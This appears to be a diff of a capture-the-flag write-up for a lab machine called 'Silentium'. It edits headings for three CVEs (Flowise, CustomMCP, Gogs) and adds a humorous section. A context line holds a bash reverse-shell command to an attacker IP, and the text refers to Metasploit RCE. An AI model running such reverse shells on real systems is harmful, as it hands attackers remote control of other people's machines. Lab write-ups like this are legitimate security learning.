@@ -179,7 +179,7 @@ At this point, my first thought wasn’t exploitation, it was just figuring out 
 
 </style>
 
-## 5. CVE #1 : Flowise Password Reset Logic (CVE-2025-58434 <span class="critical">Critical</span> )
+## 5. CVE #1 : Flowise Password Reset Logic (CVE-2025-58434 <span class="critical">CRITICAL</span> )
 
 While inspecting Flowise, I found a known security issue affecting password reset logic.
 
@@ -325,9 +325,11 @@ bash -c 'bash -i >& /dev/tcp/10.10.15.117/4444 0>&1'
 
 However, this approach did not work reliably in this environment. The payloads either failed to execute or did not return a stable reverse shell, likely due to runtime restrictions or differences in how the staging instance was configured compared to the vulnerable reference setup.
 
+![Alt text](../assets/htb/silentium/24.png)
+
 ---
 
-## 7. CVE #2 : CustomMCP JavaScript Injection (CVE-2025-59528)
+## 7. CVE #2 : CustomMCP JS Injection (CVE-2025-59528 <span class="critical">CRITICAL</span>)
 
 After the manual exploitation attempts failed, I shifted to a more stable approach using **Metasploit**, since Flowise has known authenticated RCE modules available for affected versions.
 
@@ -515,7 +517,26 @@ cat user.txt
 
 ---
 
-## 10. Local Service Discovery
+## 10 Rabbit Hole
+
+After getting the user flag, I immediately switched into full privilege escalation mode and proceeded to _lightly destroy my own brain performance_ in the process.
+
+I checked everything — SUIDs, cron jobs, kernel, hopes, dreams… nothing.
+
+At some point, I wasn’t exploiting the machine anymore, I was just arguing with linPEAS like it owed me money.
+
+![Alt text](../assets/htb/silentium/26.webp)
+
+### Summary of my findings:
+
+- 1 local service
+- some interesting env vars
+- 0 immediate wins
+- 100% overthinking damage
+
+---
+
+## 11. Local Service Discovery
 
 To enumerate running services on the host, I used:
 
@@ -559,7 +580,7 @@ At this point, it was clear that the target was exposing a local development or 
 
 ---
 
-## 11. CVE #3 : Gogs Symlink / Repo Abuse → Root (CVE-2025-8110)
+## 12. CVE #3 : Gogs Symlink / Repo Abuse → Root (CVE-2025-8110 <span class="critical">HIGH</span>)
 
 At this point, I had a stable foothold on the host as **ben**, but local privilege escalation still wasn’t obvious.
 
@@ -770,7 +791,7 @@ Once the exploit executed successfully, I obtained command execution.
 
 ![Alt text](../assets/htb/silentium/18.png)
 
-## 12. Root Flag
+## 13. Root Flag
 
 ```bash
 cat /root/root.txt
@@ -800,7 +821,7 @@ Silentium was a chain of “small mistakes that become big problems”:
 5. Local service discovery → Gogs
 6. Symlink exploit → root
 
-## 14. Conclusion
+## 15. Conclusion
 
 As a conclusion, I suddenly realized my browser was actively suffering and considering retirement.
 
